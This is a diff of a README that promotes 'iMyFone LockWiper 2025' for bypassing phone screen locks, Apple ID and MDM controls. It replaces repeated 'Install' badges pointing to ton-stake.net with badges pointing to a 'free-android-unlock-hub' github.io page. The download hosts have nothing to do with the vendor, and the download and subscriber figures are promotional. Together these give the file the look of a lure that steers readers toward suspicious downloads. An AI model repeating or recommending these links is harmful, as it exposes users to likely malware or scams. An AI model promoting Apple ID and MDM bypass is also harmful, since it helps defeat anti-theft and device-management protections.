@@ -4,7 +4,9 @@
 
 **Description**: Regain access to your iOS and Android devices with **iMyFone LockWiper 2025**! This repository provides comprehensive tutorials, guides, and resources for using LockWiper to bypass screen locks, Apple ID, and MDM locks on devices like iPhone 16, iPad Air, Samsung Galaxy S25, and more. With support for iOS 18 and Android 15, join our community with 40K+ downloads and 25K+ subscribers to master device unlocking in 2025!  
 
-[![Install iMyFone LockWiper](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://free-android-unlock-hub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ---
 
@@ -32,9 +34,10 @@ Begin your unlocking journey with iMyFone LockWiper 2025 using these simple step
 6. **Troubleshooting** ❓  
    If issues occur, disable your VPN, check your internet, or try browsers like Chrome, Firefox, or Edge.  
 
-[![Install iMyFone LockWiper](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://free-android-unlock-hub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
----
 
 ## 💡 Why Choose iMyFone LockWiper 2025  
 
@@ -45,9 +48,10 @@ Begin your unlocking journey with iMyFone LockWiper 2025 using these simple step
 - 🌍 **Active Community**: Backed by 40K+ downloads and 25K+ subscribers.  
 - 📅 **2025 Updates**: Stay current with the latest unlocking features.  
 
-[![Install iMyFone LockWiper](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://free-android-unlock-hub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
----
 
 ## 🎯 Usage Scenarios  
 
@@ -63,9 +67,6 @@ Begin your unlocking journey with iMyFone LockWiper 2025 using these simple step
 - 🛠 **MDM Bypass**: Remove Mobile Device Management locks.  
 - 📚 **Skill Building**: Learn advanced unlocking techniques from 25K+ subscribers.  
 
-[![Install iMyFone LockWiper](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
-
----
 
 ## 🏆 Benefits  
 
